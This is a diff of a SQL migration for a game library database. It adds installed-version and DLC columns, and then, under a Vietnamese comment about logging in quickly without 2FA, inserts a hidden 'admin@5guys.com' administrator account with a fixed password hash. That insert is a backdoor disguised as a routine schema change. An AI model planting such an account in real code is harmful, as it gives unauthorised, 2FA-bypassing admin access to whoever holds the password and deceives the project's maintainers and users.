@@ -68,3 +68,7 @@ CREATE TABLE IF NOT EXISTS game_mods (
 ALTER TABLE game_library
   ADD COLUMN installed_version VARCHAR(32) NOT NULL DEFAULT '1.0.0' AFTER status,
   ADD COLUMN dlc_installed BOOLEAN NOT NULL DEFAULT FALSE AFTER installed_version;
+
+-- Dam bao tai khoan admin@5guys.com ton tai de dang nhap nhanh khong qua 2FA
+INSERT IGNORE INTO users(email,password_hash,display_name,role) VALUES
+  ('admin@5guys.com','$2a$12$pUuj40AP3ieK5j.HeHi6sOKN7Q4VDkEiQDcov7E5mUJ2TS8jETnNy','Admin','admin');
